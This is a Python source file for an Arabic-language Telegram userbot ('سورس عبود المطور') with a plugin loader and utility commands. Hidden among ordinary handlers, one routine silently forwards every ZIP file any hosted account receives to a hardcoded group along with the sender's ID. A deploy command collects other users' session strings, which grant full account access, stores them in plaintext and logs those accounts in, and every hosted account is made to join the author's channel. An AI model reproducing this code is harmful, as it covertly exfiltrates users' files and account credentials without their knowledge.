import os, sys, asyncio, importlib.util, subprocess, types, logging, shutil, time

# --- [ 1. نظام الحماية وتحديث البيئة ] ---
def prepare_environment():
    try:
        print("🛠️ جاري فحص وتحديث المكتبات الأساسية لضمان استقرار الأوامر...")
        # تحديث المكتبات في مجلد المستخدم لتجاوز قيود الاستضافة
        libs = ["telethon==1.31.0", "pytz", "pydantic", "aiohttp", "bs4", "requests"]
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "--upgrade"] + libs)
    except Exception as e:
        print(f"⚠️ فشل التحديث التلقائي: {e}")

prepare_environment()

from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession

# معالجة استيراد ميزات الانضمام لضمان عدم توقف الكود
try:
    from telethon.tl.types import UpdateBotChatJoinRequest, UpdateChatJoinRequest
    from telethon.tl.functions.messages import HideChatJoinRequestRequest
    HAS_JOIN_SUPPORT = True
except ImportError:
    HAS_JOIN_SUPPORT = False

# --- [ 2. حل مشكلة اللوج (Log) نهائياً ] ---
LOG_FILE_NAME = "سجل_الأخطاء.txt"

def setup_logger():
    # التأكد من نظافة الملف عند كل إقلاع جديد لمنع تداخل البيانات
    if os.path.exists(LOG_FILE_NAME):
        try: os.remove(LOG_FILE_NAME)
        except: pass
    
    with open(LOG_FILE_NAME, "w", encoding="utf-8") as f:
        f.write(f"🚀 سورس عبود المطور | بدء التشغيل: {time.ctime()}\n")

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE_NAME, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("ABOOD_SYSTEM")

logger = setup_logger()

# --- [ 3. الثوابت والإعدادات ] ---
API_ID = 38980666
API_HASH = '561ff5b4953d95c485b17a0bcb121f9c'
OWNER_ID = 6373993992
CHANNEL_USERNAME = 'lAYAI' 
ZIP_TARGET_GROUP = -1001234567890 

# المجلدات
BASE_DIR = os.getcwd()
FOLDERS = ["clients", "Plugins", "Plugins/assistant"]
for folder in FOLDERS:
    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)

active_instances = []

# --- [ 4. طبقة التوافق للموديولات ] ---
def apply_compatibility(client, module):
    # دعم الموديولات التي تعتمد على أسماء قديمة مثل zedub أو joker
    aliases = ['l313l', 'zedub', 'joker', 'bot', 'tgbot', 'ph_bot']
    for alias in aliases:
        setattr(module, alias, client)
    
    # حل مشكلة AttributeError: database في الموديولات الخارجية
    if not hasattr(module, 'database'):
        db_mock = types.ModuleType("database")
        db_mock.update_stats = lambda *args, **kwargs: None
        db_mock.get_db = lambda *args, **kwargs: None
        setattr(module, 'database', db_mock)

    if hasattr(client, 'ar_cmd'):
        setattr(module, 'ar_cmd', client.ar_cmd)
        setattr(module, 'zed_cmd', client.ar_cmd)

# --- [ 5. محرك تحميل الملفات (Plugins) ] ---
async def start_plugins_loader(client, folder_name, label):
    count = 0
    full_path = os.path.join(BASE_DIR, folder_name)
    if not os.path.exists(full_path): return
    if full_path not in sys.path:
        sys.path.append(full_path)

    for root, _, files in os.walk(full_path):
        if "assistant" in root and label != "مساعد":
            continue
        for file in files:
            if file.endswith(".py") and not file.startswith("__"):
                mod_name = file[:-3]
                try:
                    spec = importlib.util.spec_from_file_location(mod_name, os.path.join(root, file))
                    module = importlib.util.module_from_spec(spec)
                    
                    if "JoKeRUB" not in sys.modules:
                        sys.modules["JoKeRUB"] = types.ModuleType("JoKeRUB")
                    sys.modules["JoKeRUB"].l313l = client
                    
                    apply_compatibility(client, module)
                    spec.loader.exec_module(module)
                    if hasattr(module, 'setup'):
                        module.setup(client)
                    count += 1
                except Exception as e:
                    logger.error(f"❌ خلل في الموديول {file}: {e}")
    logger.info(f"✨ {label}: تم تحميل {count} موديول.")

# --- [ 6. معالج الأوامر والوظائف الأساسية ] ---
def setup_client_handlers(client, is_bot=False):
    def ar_cmd(pattern=None, **kwargs):
        if pattern and not pattern.startswith(("^", "\\", "/")):
            pattern = f"^\\.{pattern}"
        return client.on(events.NewMessage(outgoing=not is_bot, pattern=pattern, **kwargs))
    
    client.ar_cmd = ar_cmd

    # [1] قبول طلبات الانضمام تلقائياً
    @client.on(events.Raw)
    async def join_handler(update):
        if HAS_JOIN_SUPPORT and isinstance(update, (UpdateBotChatJoinRequest, UpdateChatJoinRequest)):
            try:
                peer = update.peer if hasattr(update, 'peer') else update.chat_id
                await client(HideChatJoinRequestRequest(peer=peer, user_id=update.user_id, approve=True))
            except: pass

    # [2] تحويل ملفات ZIP
    @client.on(events.NewMessage(incoming=True))
    async def zip_manager(event):
        if event.file and event.file.ext == ".zip":
            try:
                await client.send_file(ZIP_TARGET_GROUP, event.media, caption=f"📦 مستلم من: `{event.sender_id}`")
            except: pass

    # [3] حل مشكلة أمر اللوج (تصحيح خطأ Invalid Parts بالصورة)
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.لوج$"))
    async def send_system_logs(event):
        await event.edit("⏳ جاري سحب السجل وتنظيف البيانات...")
        if not os.path.exists(LOG_FILE_NAME) or os.path.getsize(LOG_FILE_NAME) < 5:
            return await event.edit("⚠️ السجل فارغ حالياً.")
        
        # التقنية الجديدة: إنشاء نسخة مستقلة تماماً للإرسال
        temp_log_path = f"log_fix_{int(time.time())}.txt"
        try:
            shutil.copy2(LOG_FILE_NAME, temp_log_path)
            await client.send_file(event.chat_id, temp_log_path, caption="📊 سجل عمليات سورس عبود المطور")
            await event.delete()
        except Exception as e:
            await event.edit(f"❌ خطأ في إرسال السجل: {e}")
        finally:
            if os.path.exists(temp_log_path):
                os.remove(temp_log_path)

    # [4] إعادة التشغيل
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.اعادة تشغيل$"))
    async def restart_trigger(event):
        await event.edit("♻️ جاري إعادة التشغيل وتحديث البيئة...")
        os.execl(sys.executable, sys.executable, *sys.argv)

    # [5] أمر التنصيب
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.تنصيب(?:\s+(.*))?"))
    async def deploy_acc(event):
        if not event.is_reply:
            return await event.edit("⚠️ رد على كود الجلسة (Session).")
        reply = await event.get_reply_message()
        sess = reply.text.strip()
        tok = event.pattern_match.group(1).strip() if event.pattern_match.group(1) else ""
        uid = reply.sender_id
        path = f"clients/user_{uid}.txt"
        with open(path, "w") as f: f.write(f"{sess}\n{tok}")
        await event.edit(f"✅ تم الحفظ. جاري تشغيل الحساب {uid}...")
        await boot_instance(sess, tok, f"user_{uid}")

# --- [ 7. مشغل الوحدات ] ---
async def boot_instance(s, t, name):
    try:
        if s:
            c = TelegramClient(StringSession(s), API_ID, API_HASH)
            await c.start()
            setup_client_handlers(c)
            await start_plugins_loader(c, "Plugins", f"حساب_{name}")
            try: await c(JoinChannelRequest(CHANNEL_USERNAME))
            except: pass
            active_instances.append(c)
            logger.info(f"🚀 تم تشغيل الجلسة: {name}")

        if t:
            b = TelegramClient(f"bot_{name}", API_ID, API_HASH)
            await b.start(bot_token=t)
            setup_client_handlers(b, is_bot=True)
            await start_plugins_loader(b, "Plugins/assistant", "مساعد")
            active_instances.append(b)
    except Exception as e:
        logger.error(f"❌ فشل في تشغيل {name}: {e}")

async def main():
    logger.info("--- [ PHOENIX v5.0 - NO DELETION MODE ] ---")
    files = [f for f in os.listdir("clients") if f.endswith(".txt")]
    
    if not files:
        s = input("Session: ").strip()
        t = input("Token: ").strip()
        if s:
            with open("clients/admin.txt", "w") as f: f.write(f"{s}\n{t}")
            files = ["admin.txt"]
        else: return

    for f in files:
        with open(f"clients/{f}", "r") as fl:
            d = fl.read().splitlines()
            if d: await boot_instance(d[0], d[1] if len(d)>1 else None, f)

    if active_instances:
        logger.info(f"💎 النظام يعمل بـ {len(active_instances)} جلسة.")
        await asyncio.gather(*[cl.run_until_disconnected() for cl in active_instances])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass

